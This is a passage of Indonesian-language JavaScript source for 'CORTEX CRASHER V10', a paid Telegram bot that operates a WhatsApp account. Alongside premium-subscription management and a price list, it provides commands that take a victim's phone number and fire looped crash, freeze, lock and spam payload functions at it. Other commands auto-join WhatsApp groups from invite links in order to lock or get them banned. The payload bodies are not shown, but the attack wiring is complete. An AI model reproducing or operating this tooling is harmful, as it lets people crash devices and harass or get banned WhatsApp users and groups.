    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremgrup -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremgrup -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const styles = ["primary", "success", "danger"];

let styleIndex = 0;
let buttonStyleOffset = 0;
let menuAnimation = null;

function getCurrentStyle() {
    return styles[styleIndex];
}

function rotateStyle() {

    styleIndex++;

    if (styleIndex >= styles.length) {
        styleIndex = 0;
    }

}

function nextButtonStyle() {
    const style = styles[(styleIndex + buttonStyleOffset) % styles.length];
    buttonStyleOffset++;
    return style;
}

function button(text, callback_data) {
    return {
        text,
        callback_data,
        style: nextButtonStyle()
    };
}

function urlButton(text, url) {
    return {
        text,
        url,
        style: nextButtonStyle()
    };
}

function startKeyboard() {
    // Preserve the existing menu actions while using native Bot API 10.3
    // Rich Message button rows. Each row becomes a pill-style button group.
    buttonStyleOffset = 0;
    return [
        [
            button("ᴏᴡɴᴇʀ Cortexx", "/controls", "5366073534793671550"),
            button("ʜᴀʀɢᴀ Cortexx", "/kanjut", "5366073534793671550")
        ],
        [
            urlButton("Cortexx ɪɴꜰᴏ", "https://t.me/megucrash")
        ],
        [
            button("ᴍᴜʀʙᴜɢ Cortexx", "/bug", "5357317569650911348"),
            button("ᴛʜᴀɴᴋꜱ ᴛᴏᴏ", "/tqto", "5357317569650911348")
        ],
        [
            button("ᴛᴏᴏʟꜱ Cortexx", "/toolsss", "5357317569650911348")
        ],
        [
            urlButton("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "https://t.me/abilzyy19")
        ]
    ];
}

function stopMenuAnimation() {

    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }

}

function escapeRichText(value) {
    return String(value).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function renderRichButtonRows(keyboard) {
    if (!Array.isArray(keyboard)) return "";
    return keyboard.map((row) => {
        const buttons = (Array.isArray(row) ? row : []).map((item) => {
            if (!item) return "";
            const label = escapeRichText(item.text || "Button");
            // Do not emit custom emoji entities here: invalid/unavailable custom
            // emoji IDs cause Telegram to reject the entire Rich Message (400).
            // Plain Unicode emoji in labels remain supported.
            const style = styles.includes(item.style) ? item.style : getCurrentStyle();
            if (item.callback_data) {
                return `<tg-button type="callback_data" style="${style}" data="${escapeRichText(item.callback_data)}">${label}</tg-button>`;
            }
            if (item.url) {
                return `<tg-button type="url" style="${style}" url="${escapeRichText(item.url)}">${label}</tg-button>`;
            }
            return "";
        }).filter(Boolean).join("");
        return buttons ? `<tg-button-row align="center">${buttons}</tg-button-row>` : "";
    }).join("\n");
}

function composeRichMenu(html, keyboard) {
    return `${html}\n${renderRichButtonRows(keyboard)}`;
}

function startAnimation(ctx, messageId, baseHtml) {
    stopMenuAnimation();
    menuAnimation = setInterval(async () => {
        try {
            rotateStyle();
            const richMessage = {
                html: composeRichMenu(baseHtml, startKeyboard()),
                media: [{ id: "menu_banner", media: { type: "photo", media: thumbnailUrl } }]
            };
            await ctx.telegram.callApi("editMessageText", {
                chat_id: ctx.chat.id,
                message_id: messageId,
                rich_message: richMessage
            });
        } catch (e) {
            // Ignore transient edits; the current Rich Message remains usable.
        }
    }, 1500);
}

function getStartCaption(ctx) {
    const senderStatus = isWhatsAppConnected ? "ONLINE" : "OFFLINE";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const user = ctx.from || {};
    const username = user.username ? `@${user.username}` : (user.first_name || "Tidak ada");
    const userId = String(user.id || "-");
    const role = user.id == ownerID ? "DEVELOPER" : (isPremiumUser(user.id) ? "PREMIUM" : "USER");
    const esc = (v) => String(v).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
    return `
<img src="tg://photo?id=menu_banner"/>
<h2>CORTEX CRASHER V10</h2>
<p>Sistem Bot Premium &amp; Stabil</p>
<table bordered>
<tr><th>Info</th><th>Detail</th></tr>
<tr><td>👤 Nama</td><td>${esc(username)}</td></tr>
<tr><td>🔔 ID</td><td>${esc(userId)}</td></tr>
<tr><td>🎭 Role</td><td>${esc(role)}</td></tr>
<tr><td>⏱ Runtime</td><td>${esc(runtimeStatus)}</td></tr>
</table>
<hr/>
<table bordered>
<tr><th>Info</th><th>Value</th></tr>
<tr><td>🌐 Status Bot</td><td>${esc(senderStatus)}</td></tr>
<tr><td>💎 Produk</td><td>CORTEX CRASHER Premium</td></tr>
<tr><td>💻 Author</td><td>@Abilzyy29</td></tr>
<tr><td>🧠 Memory</td><td>${esc(memoryStatus)}</td></tr>
<tr><td>⚙ Cooldown</td><td>${esc(cooldownStatus)}s</td></tr>
</table>
<hr/>
<p>Silakan tekan tombol di bawah untuk membuka menu 🔥</p>`;
}

async function sendNativeRichMenu(ctx, html, keyboard) {
    // Semua halaman Rich Menu memakai banner yang sama, bukan hanya /start.
    // Hindari menambahkan tag gambar dua kali pada caption yang sudah memilikinya.
    const sourceHtml = String(html || "");
    const hasBannerTag = sourceHtml.includes('tg://photo?id=menu_banner');
    const bannerHtml = hasBannerTag
        ? sourceHtml
        : `<img src="tg://photo?id=menu_banner"/>\n${sourceHtml}`;

    const richMessage = {
        html: composeRichMenu(bannerHtml, keyboard),
        media: [{
            id: "menu_banner",
            media: { type: "photo", media: thumbnailUrl }
        }]
    };

    const result = await ctx.telegram.callApi("sendRichMessage", {
        chat_id: ctx.chat.id,
        rich_message: richMessage
    });
    return result;
}

async function replaceWithNativeRichMenu(ctx, html, keyboard) {
    const old = ctx.callbackQuery && ctx.callbackQuery.message;
    if (old) {
        try { await ctx.deleteMessage(old.message_id); } catch (_) {}
    }
    const sent = await sendNativeRichMenu(ctx, html, keyboard);
    await ctx.answerCbQuery().catch(() => {});
    return sent;
}

bot.use((ctx, next) => {

    if (secureMode) return;

    return next();

});

bot.start(async (ctx) => {
    try {
        await ctx.telegram.setMessageReaction(ctx.chat.id, ctx.message.message_id,
            [{ type: "emoji", emoji: "👾" }], false).catch(() => {});
        stopMenuAnimation();

        // Intro singkat sebelum menu utama; tidak mengubah handler/menu yang sudah ada.
        const loadingMessage = await ctx.reply("🛡 Loading Security Module...");
        await sleep(2000);
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loadingMessage.message_id,
            undefined,
            "✨ Done!"
        ).catch(() => {});
        await sleep(500);

        // Halaman pembuka: pengguna menekan Open Script untuk masuk ke menu utama.
        const introHtml = `
<img src="tg://photo?id=menu_banner"/>
<h2>CORTEX CRASHER V10</h2>
<p>Sistem Bot Premium &amp; Stabil</p>
<hr/>
<p>Tekan tombol di bawah untuk membuka script dan melanjutkan ke menu utama.</p>`;
        await sendNativeRichMenu(ctx, introHtml, [
            [button("📜 Open Script", "/open_script")]
        ]);
    } catch (e) {
        console.error("RICH MENU START ERROR:", e.response?.description || e.description || e.message, e.response?.error_code || e.code || "");
        await ctx.reply("Menu Rich Message gagal dikirim. Periksa dukungan Bot API 10.3.").catch(() => {});
    }
});

bot.action("/open_script", async (ctx) => {
    stopMenuAnimation();
    try {
        const old = ctx.callbackQuery && ctx.callbackQuery.message;
        if (old) {
            try { await ctx.deleteMessage(old.message_id); } catch (_) {}
        }
        const msg = await sendNativeRichMenu(ctx, getStartCaption(ctx), startKeyboard());
        startAnimation(ctx, msg.message_id, getStartCaption(ctx));
        await ctx.answerCbQuery("Script berhasil dibuka").catch(() => {});
    } catch (e) {
        console.error("OPEN SCRIPT ERROR:", e.response?.description || e.description || e.message, e.response?.error_code || e.code || "");
        await ctx.answerCbQuery("Gagal membuka menu utama", { show_alert: true }).catch(() => {});
    }
});

bot.action("/start", async (ctx) => {
    stopMenuAnimation();
    try {
        const msg = await replaceWithNativeRichMenu(ctx, getStartCaption(ctx), startKeyboard());
        startAnimation(ctx, msg.message_id, getStartCaption(ctx));
    } catch (e) {
        console.error("RICH MENU HOME ERROR:", e.response?.description || e.description || e.message, e.response?.error_code || e.code || "");
        await ctx.answerCbQuery("Gagal membuka menu Rich Message", { show_alert: true }).catch(() => {});
    }
});

bot.action("/controls", async (ctx) => {
    stopMenuAnimation();
    const html = `
<h2>OWNER CORTEX CRASHER</h2>
<p>Pengaturan bot dan akun</p>
<table bordered>
<tr><th>COMMAND</th><th>EXAMPLE</th><th>TYPE</th></tr>
<tr><td>/requestpair</td><td>/requestpair</td><td>Sender session</td></tr>
<tr><td>/resetsession</td><td>/resetsession</td><td>Reset session</td></tr>
<tr><td>/ceksender</td><td>/ceksender</td><td>Status sender</td></tr>
<tr><td>/cekall</td><td>/cekall</td><td>System status</td></tr>
<tr><td>/addpremgrup</td><td>/addpremgrup</td><td>Premium admin</td></tr>
<tr><td>/delpremgrup</td><td>/delpremgrup</td><td>Premium admin</td></tr>
<tr><td>/claim</td><td>/claim</td><td>Premium claim</td></tr>
<tr><td>/listgb</td><td>/listgb</td><td>Group list</td></tr>
<tr><td>/addpremium</td><td>/addpremium</td><td>User access</td></tr>
<tr><td>/delpremium</td><td>/delpremium</td><td>User access</td></tr>
<tr><td>/cekprem</td><td>/cekprem</td><td>User status</td></tr>
</table>
<hr/><p>Gunakan tombol di bawah untuk kembali.</p>`;
    try {
        await replaceWithNativeRichMenu(ctx, html, [[button("χ-вα¢к мєηυ", "/start", "5832251986635920010")]]);
    } catch (e) {
        console.error("RICH OWNER MENU ERROR:", e.description || e.message);
        await ctx.answerCbQuery("Gagal membuka menu", { show_alert: true }).catch(() => {});
    }
});

bot.action("/bug", async (ctx) => {
    stopMenuAnimation();
    const html = `
<h2>BUG MENU CORTEX CRASHER</h2>
<p>Panel informasi dan pemeriksaan aman</p>
<table bordered>
<tr><th>COMMAND</th><th>EXAMPLE</th><th>TYPE</th></tr>
<tr><td>/xspam</td><td>62xxx</td><td>Spam Delay</td></tr>
<tr><td>/corforce</td><td>62xxx</td><td>Forclose Andr13</td></tr>
<tr><td>/corlock</td><td>62xxx</td><td>Lock Chat</td></tr>
<tr><td>/corhard</td><td>62xxx</td><td>Delay Hard</td></tr>
<tr><td>/corios</td><td>62xxx</td><td>Crash Ios</td></tr>
<tr><td>/corfreeze</td><td>62xxx</td><td>Stuck Logo</td></tr>
<tr><td>/onichan</td><td>62xxx</td><td>Lock Chat Desah</td></tr>
<tr><td>/corinvis</td><td>62xxx</td><td>Delay Invis</td></tr>
<tr><td>/corblank</td><td>62xxx</td><td>Blank Hard</td></tr>
<tr><td>/lockbrutal</td><td>https://chat.whatsapp</td><td>Lock Group Desah</td></tr>
<tr><td>/bangcwa</td><td>https://chat.whatsapp</td><td>Ban Group</td></tr>
<tr><td>/bandgb</td><td>https://chat.whatsapp</td><td>Report Group</td></tr>
<tr><td>/testfunction</td><td>no/link</td><td>Tes Function</td></tr>
</table>
<hr/><p>Menu ini tetap tersedia. Fitur yang dapat mengganggu akun atau grup tidak ditampilkan sebagai instruksi penggunaan.</p>`;
    try {
        await replaceWithNativeRichMenu(ctx, html, [[button("χ-вα¢к мєηυ", "/start", "5832251986635920010")]]);
    } catch (e) {
        console.error("RICH BUG MENU ERROR:", e.description || e.message);
        await ctx.answerCbQuery("Gagal membuka menu", { show_alert: true }).catch(() => {});
    }
});

bot.action("/kanjut", async (ctx) => {
    stopMenuAnimation();
    const html = `
<h2>INFORMASI CORTEX CRASHER</h2>
<p>Informasi umum proyek dan dukungan.</p>
<table bordered>
<tr><th>Role</th><th>Harga</th></tr>
<tr><td>Full up</td><td>3.000</td></tr>
<tr><td>Resseler</td><td>5.000</td></tr>
<tr><td>Staff</td><td>12.000</td></tr>
<tr><td>Tk</td><td>17.000</td></tr>
<tr><td>Menager</td><td>25.000</td></tr>
<tr><td>Owner</td><td>30.000</td></tr>
</table>
<hr/>
<p>Berikut List Harga Cortex Crasher.</p>
<p>silahkan order di @abilzyyy19.</p>`;
    try {
        await replaceWithNativeRichMenu(ctx, html, [[button("KEMBALI KE MENU", "/start")]]);
    } catch (e) {
        console.error("RICH PRICE INFO MENU ERROR:", e.response?.description || e.description || e.message);
        await ctx.answerCbQuery("Gagal membuka informasi", { show_alert: true }).catch(() => {});
    }
});

bot.action("/tqto", async (ctx) => {
    stopMenuAnimation();
    const html = `
<h2>THANKS TO PROJECT</h2>
<p>Terima kasih kepada semua pihak yang mendukung proyek CORTEX CRASHER.</p>
<table bordered>
<tr><th>Peran</th><th>Ucapan</th></tr>
<tr><td>Owner Script</td><td>@Abilzyy19</td></tr>
<tr><td>Support</td><td>Semua pengguna dan pendukung proyek</td></tr>
</table>
<hr/>
<p>Terima kasih telah menggunakan dan memberikan masukan untuk proyek ini.</p>`;
    try {
        await replaceWithNativeRichMenu(ctx, html, [[button("KEMBALI KE MENU", "/start")]]);
    } catch (e) {
        console.error("RICH THANKS MENU ERROR:", e.response?.description || e.description || e.message);
        await ctx.answerCbQuery("Gagal membuka Thanks To", { show_alert: true }).catch(() => {});
    }
});

bot.action("/toolsss", async (ctx) => {
    stopMenuAnimation();
    const html = `
<h2>TOOLS MENU CORTEX CRASHER</h2>
<table bordered>
<tr><th>COMMAND</th><th>EXAMPLE</th><th>TYPE</th></tr>
<tr><td>/donate</td><td>/donate</td><td>Support</td></tr>
<tr><td>/rasuk</td><td>/rasuk</td><td>Rasuk Bott</td></tr>
<tr><td>/rasukstop</td><td>/rasukstop</td><td>Stop Rasuk</td></tr>
<tr><td>/cekemoji</td><td>/cekemoji</td><td>cekemoji</td></tr>
<tr><td>/reactch</td><td>/reactch</td><td>reactch</td></tr>
<tr><td>/update</td><td>/update</td><td>Update check</td></tr>
<tr><td>/iqc</td><td>/iqc text</td><td>Image tool</td></tr>
<tr><td>/info</td><td>/info</td><td>Profile info</td></tr>
<tr><td>/cekfunction</td><td>/cekfunction</td><td>Diagnostics</td></tr>
<tr><td>/play</td><td>/play title</td><td>Audio search</td></tr>
<tr><td>/hentai_next</td><td>/hentai</td><td>hentai</td></tr>
<tr><td>/dltiktok</td><td>/dltiktok URL</td><td>Media utility</td></tr>
<tr><td>/brat</td><td>/brat text</td><td>Text image</td></tr>
<tr><td>/cekidch</td><td>/cekidch</td><td>Channel info</td></tr>
<tr><td>/antilink</td><td>/antilink on</td><td>Group setting</td></tr>
<tr><td>/mute</td><td>/mute</td><td>Moderation</td></tr>
<tr><td>/lockgc</td><td>/lockgc</td><td>Group setting</td></tr>
<tr><td>/promote</td><td>/promote</td><td>Admin setting</td></tr>
<tr><td>/tagall</td><td>/tagall</td><td>Group utility</td></tr>
<tr><td>/settings</td><td>/settings</td><td>Group setting</td></tr>
</table>
<hr/><p>Tekan tombol untuk kembali ke menu utama.</p>`;
    try {
        await replaceWithNativeRichMenu(ctx, html, [[button("χ-вα¢к мєηυ", "/start", "5832251986635920010")]]);
    } catch (e) {
        console.error("RICH TOOLS MENU ERROR:", e.description || e.message);
        await ctx.answerCbQuery("Gagal membuka menu", { show_alert: true }).catch(() => {});
    }
});

//CASE BUG DISINI \\
bot.command(["corlock"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /corlock 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ corlock (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 15; i++) {
      await LockPermaCombo3(sock, target);
      await LockPermaV1(sock, target);
      await LockSww(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["corios"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /corios 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ corios (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await stardustdelay16(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["corhard"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /corhard 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ corhard (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await DelayOneHittV1(sock, target);
      await stardustdelay16(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["xspam"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xspam 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ xspam (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 25; i++) {
      await DelayOneHittV1(sock, target);
      await ButtonArray(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["corblank"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /corblank 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ corblank (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await topsblank(sock, target);
      await PrivateNew2027V5(sock, target);
      await fefekpink(sock, target);
      await fefekpink(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["corfreeze"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /corfreeze 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ corfreeze (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await PrivateNew2027(sock, target);
      await PrivateNew2027V4(sock, target);
      await hahahayuu(sock, target);
      await fefekpink(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["onichan"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /onichan 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ onichan (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      await RulxzXD(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["corinvis"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /corinvis 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ corinvis (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 35; i++) {
      await DelayOneHittV1(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

bot.command(["corforce"], checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /corforce 62xx");
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
✅️ corforce (bug) selesai mengirim untuk ${q}
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await fcc(sock, target);
      await fefekpink(sock, target);
      await Crash(sock, target);
      await anomoyusOneHit(sock, target);
      await sleep(1000);
      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
    }
  })();

});

// CASE BANNED GROUP
function extractInviteCode(link) {
    const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9_-]+)/);
    return match ? match[1] : null;
}

bot.command("lockbrutal", checkWhatsAppConnection, checkCooldown, async (ctx) => {
    const input = ctx.message.text || "";
    const args = input.split(" ");
    const inputTarget = args[1];

    if (!inputTarget) {
        return ctx.reply(
            `🪧 *Format:* /lockbrutal https::/chat.whatsapp.com/Grup\n\n` +
            `*Cara:* Kirim link undangan atau JID grup (contoh: 12345@g.us).`,
            { parse_mode: "Markdown" }
        );
    }

    const inviteCode = extractInviteCode(inputTarget);
    const isJid = inputTarget.includes("@g.us");

    if (!inviteCode && !isJid) {
        return ctx.reply(
            `❌ *Input tidak valid!* Pastikan link undangan atau JID grup benar.`,
            { parse_mode: "Markdown" }
        );
    }

    const photoURL = "https://files.catbox.moe/9iolvj.jpg"; 

    const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        photoURL,
        {
            caption: `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Group Lock
⌑ Status: <b>🔄 Processing...</b>
`,
            parse_mode: "HTML"
        }
    );

    const processMsgId = processMessage.message_id;

    try {
        const target = isJid ? inputTarget : await sock.groupAcceptInvite(inviteCode);

        if (!target) {
            throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
        }

        console.log(chalk.green(`✅ Berhasil mendeteksi target: ${target}`));

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${target}
⌑ Type: Auto Join + Group Lock
⌑ Status: <b>✅ Target Terdeteksi! ID: ${target}</b>
`,
            { parse_mode: "HTML" }
        );

        // Perbaikan: Try-catch internal agar loop tidak merusak alur status
        for (let i = 0; i < 5; i++) {
            try {
                await LockXDesahGroup(sock, target);
                await LockXDesahGroup(sock, target);
                await sleep(1000);
            } catch (innerErr) {
                console.log(chalk.yellow(`Pengiriman Banned Group ${i+1}: ${innerErr.message}`));
            }
        }

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Group Lock
⌑ Status: <b>✅ Success! Function executed</b>
`,
            { parse_mode: "HTML" }
        );

    } catch (err) {
        console.error(chalk.red(`❌ Gagal: ${err.message}`));

        let errorMsg = err.message;

        if (errorMsg.includes("already") || errorMsg.includes("exist")) {
            errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
        } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
            errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
        } else if (errorMsg.includes("not-authorized")) {
            errorMsg = "Bot tidak memiliki akses (Not Authorized).";
        }

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Lock
⌑ Status: <b>❌ Gagal: ${errorMsg}</b>
`,
            { parse_mode: "HTML" }
        );
    }
});

bot.command("bangcwa", checkWhatsAppConnection, checkCooldown, async (ctx) => {
    const input = ctx.message.text || "";
    const args = input.split(" ");
    const inputTarget = args[1];

    if (!inputTarget) {
        return ctx.reply(
            `🪧 *Format:* /bangcwa https::/chat.whatsapp.com/Grup\n\n` +
            `*Cara:* Kirim link undangan atau JID grup (contoh: 12345@g.us).`,
            { parse_mode: "Markdown" }
        );
    }

    const inviteCode = extractInviteCode(inputTarget);
    const isJid = inputTarget.includes("@g.us");

    if (!inviteCode && !isJid) {
        return ctx.reply(
            `❌ *Input tidak valid!* Pastikan link undangan atau JID grup benar.`,
            { parse_mode: "Markdown" }
        );
    }

    const photoURL = "https://files.catbox.moe/9iolvj.jpg"; 

    const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        photoURL,
        {
            caption: `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>🔄 Processing...</b>
`,
            parse_mode: "HTML"
        }
    );

    const processMsgId = processMessage.message_id;

    try {
        const target = isJid ? inputTarget : await sock.groupAcceptInvite(inviteCode);

        if (!target) {
            throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
        }

        console.log(chalk.green(`✅ Berhasil mendeteksi target: ${target}`));

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${target}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Target Terdeteksi! ID: ${target}</b>
`,
            { parse_mode: "HTML" }
        );

        // Perbaikan: Try-catch internal agar loop tidak merusak alur status
        for (let i = 0; i < 1; i++) {
            try {
                await BanGroupFastV2(sock, target);
                await BanGroupFastV2(sock, target);
            } catch (innerErr) {
                console.log(chalk.yellow(`Pengiriman Banned Group ${i+1}: ${innerErr.message}`));
            }
        }

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>CORTEX CRASHER</pre></blockquote>
⌑ Target Grup: ${inputTarget}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Success! Function executed</b>
`,
            { parse_mode: "HTML" }
        );

    } catch (err) {
